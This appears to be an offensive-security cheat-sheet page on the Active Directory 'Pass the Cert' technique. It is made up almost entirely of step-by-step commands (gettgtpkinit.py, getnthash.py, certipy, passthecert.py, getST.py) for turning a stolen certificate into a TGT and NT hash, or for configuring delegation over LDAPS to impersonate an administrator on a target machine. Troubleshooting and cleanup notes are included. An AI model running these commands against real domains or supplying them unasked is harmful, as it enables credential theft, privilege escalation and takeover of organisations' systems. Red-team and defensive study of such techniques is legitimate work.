**Pass the Cert** — once you hold a login certificate for an account (obtained through an AD CS attack), that certificate *is* the account's credential, so you can use it in place of a password. If PKINIT — Kerberos' certificate-based logon — is configured, you exchange the certificate for a TGT (the domain's master login ticket) and can even pull back the account's NT hash. If PKINIT is not available, you can still authenticate directly to services that accept a client certificate over TLS, such as LDAPS, and act as that account there.

```
cert + PKINIT    -> TGT -> account's NT hash
cert, no PKINIT  -> LDAPS client-cert auth -> act as the account
```

## Discovery

**Note:** If you get `KDC has no support for PADATA type` when performing Kerberos pre-authentication with a certificate, the Domain Controller does not have a certificate suitable for this kind of authentication (e.g. no "Domain Controller" / "Domain Controller Authentication" template installed).

In that case the certificate can still be used over LDAPS - see [Gain admin privileges (without PKINIT)](#gain-admin-privileges-without-pkinit).

## Exploitation

### Obtain the NT hash (PKINIT)

1. Request a TGT using the certificate.

```bash

gettgtpkinit.py -cert-pfx 'USER_OR_COMPUTER.pfx' -dc-ip 'DC_IP' 'DOMAIN/USER_OR_COMPUTER' 'USER_OR_COMPUTER.ccache'

```

2. Get the NT hash. `ENCRYPTION_KEY` is printed by `gettgtpkinit.py` in the previous step.

```bash

export KRB5CCNAME=USER_OR_COMPUTER.ccache
getnthash.py 'DOMAIN/USER_OR_COMPUTER' -key 'ENCRYPTION_KEY'

```

### Gain admin privileges (without PKINIT)

Scenario:
- You already have a computer account (`COMPUTER_NAME$`).
- You obtained a certificate for a different computer account (`TARGET$`).
- PKINIT is not configured.
- LDAPS is configured on the Domain Controllers.

You can get admin privileges on the target by configuring RBCD over LDAPS (LDAPS supports client-certificate auth through Schannel over TLS).

1. Convert the certificate. `passthecert.py` needs separate CRT and KEY files, extracted from the PFX (generated by `certipy`).

```bash

certipy cert -pfx 'TARGET.pfx' -nokey -out 'TARGET.crt'
certipy cert -pfx 'TARGET.pfx' -nocert -out 'TARGET.key'

```

2. Authenticate on LDAPS and configure RBCD on the target computer account.

```bash

passthecert.py -crt 'TARGET.crt' -key 'TARGET.key' -domain 'DOMAIN' -action write_rbcd -delegate-to 'TARGET$' -delegate-from 'COMPUTER_NAME$' -dc-ip 'DC_IP'

```

3. Use the computer account you already have to request a Service Ticket for any user on behalf of the target machine.

```bash

getST.py -spn 'CIFS/TARGET_FQDN' -impersonate 'ADM_NAME' -dc-ip 'DC_IP' 'DOMAIN/COMPUTER_NAME$' -hashes ':COMPUTER_NT_HASH'

```

**Note:** `ADM_NAME` can be any domain account with admin privileges on `TARGET` (e.g. `Administrator`).

**Note:** `KDC_ERR_CLIENT_REVOKED (Clients credentials have been revoked)` usually means the account you want to impersonate is disabled.

4. Use the Service Ticket to execute commands on `TARGET` - see [Windows Remote Command Execution](../Lateral%20Movement/Windows%20Remote%20Command%20Execution.md).

5. Cleanup - remove the RBCD you configured.

```bash

passthecert.py -crt 'TARGET.crt' -key 'TARGET.key' -domain 'DOMAIN' -action remove_rbcd -delegate-to 'TARGET$' -delegate-from 'COMPUTER_NAME$' -dc-ip 'DC_IP'

```
